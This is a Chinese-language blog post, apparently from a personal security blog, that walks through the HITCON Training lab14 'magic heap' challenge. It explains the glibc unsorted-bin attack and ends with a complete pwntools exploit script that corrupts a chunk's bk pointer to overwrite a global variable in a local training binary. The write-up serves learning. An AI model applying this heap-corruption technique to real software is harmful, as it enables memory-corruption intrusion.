@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>HITCON Training lab14 magic heap | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="house of force">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON Training lab14 magic heap">
+<meta property="og:url" content="http://yoursite.com/2018/09/19/HITCON Training lab14 magic heap/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="house of force">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-09-19T14:09:21.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITCON Training lab14 magic heap">
+<meta name="twitter:description" content="house of force">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介-："><span class="toc-text">简介 ：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解析-："><span class="toc-text">解析 ：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-："><span class="toc-text">原理 ：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-："><span class="toc-text">EXP ：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-HITCON Training lab14 magic heap" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">HITCON Training lab14 magic heap</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.09.19</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="简介-："><a href="#简介-：" class="headerlink" title="简介 ："></a>简介 ：</h2><p>一道关于unsort bin利用的文章，unsort bin的利用和top chunk的利用差不多，没有很难，把数据结构里的双向链表弄明白就很容易理解了。来解一解training lab中的题目。</p>
+<h2 id="解析-："><a href="#解析-：" class="headerlink" title="解析 ："></a>解析 ：</h2><p>unsort bin我目前感觉是没什么用的，因为实质上就是一个指针赋值了而已。。</p>
+<h3 id="原理-："><a href="#原理-：" class="headerlink" title="原理 ："></a>原理 ：</h3><p>就是在unsort bin中的一块chunk处，将该chunk的bk指针改为任意一处，因为<strong>unsort bin的遍历是倒叙的，也就是按照bk指针来遍历的。</strong>所以说，改了bk指针后有不一样的效果。</p>
+<p>改了之后再取出相同size的chunk，取出chunk的过程中指针变化是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    if (__builtin_expect(chunksize_nomask(victim) &lt;= 2 * SIZE_SZ, 0) ||</span><br><span class="line">        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, 0))</span><br><span class="line">        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">       If a small request, try to use last remainder if it is the</span><br><span class="line">       only chunk in unsorted bin.  This helps promote locality for</span><br><span class="line">       runs of consecutive small requests. This is the only</span><br><span class="line">       exception to best-fit, and applies only when there is</span><br><span class="line">       no exact fit for a small chunk.</span><br><span class="line">     */</span><br><span class="line">    /* 显然，bck被修改，并不符合这里的要求*/</span><br><span class="line">    if (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* remove from unsorted list */</span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>
+<p>主要关注一下最后一块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>
+<p>这一块，其实就是：</p>
+<ul>
+<li>victim = unsorted_chunks(av)-&gt;bk=p</li>
+<li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li>
+<li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li>
+<li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li>
+</ul>
+<p>victim为将要申请出去的chunk，bck为伪造将要申请出去的chunk的bk的chunk，所以本质上就是将unsort_chunk(av)的bk指针指向了bck，再将bck的fd指针指向了unsort_chunk(av)。</p>
+<p>再来看题目 ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  magicheap checksec ./magicheap </span><br><span class="line">[*] &apos;/home/parallels/Desktop/PWN/PwnWiKi/heap/magicheap/magicheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>看了下程序，就在edit编辑块有任意字节堆溢出，所以这时候就可以利用好unsort bin。而且这里只要不使得<code>magic &lt;= 0x1305</code>就可以<code>cat flag</code>了。所以说直接利用unsort bin将<code>magic</code>处变为指向unsort_chunk(av)的指针就可以了。这样得到的数必定大于0x1305。</p>
+<p>很简单就不详细说了，直接看exp吧。</p>
+<h2 id="EXP-："><a href="#EXP-：" class="headerlink" title="EXP ："></a>EXP ：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = process(&apos;./magicheap&apos;)</span><br><span class="line"></span><br><span class="line">def create_heap(size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit_heap(idx, size, content):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def del_heap(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create_heap(0x10,&apos;AAAAAAAA&apos;)</span><br><span class="line">create_heap(0x90,&apos;AAAAAAAA&apos;)</span><br><span class="line">create_heap(0x10,&apos;AAAAAAAA&apos;)</span><br><span class="line">del_heap(1)</span><br><span class="line"></span><br><span class="line">payload = p64(0x0)*3 + p64(0xa1) + p64(0x0) + p64(0x6020C0 - 0x10)</span><br><span class="line">edit_heap(0,len(payload)+1,payload)</span><br><span class="line"></span><br><span class="line">create_heap(0x90,p64(0x1305))</span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">r.sendline(&apos;4869&apos;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/09/18/house of force2/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2098/03/09/V1NKe's Diary/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
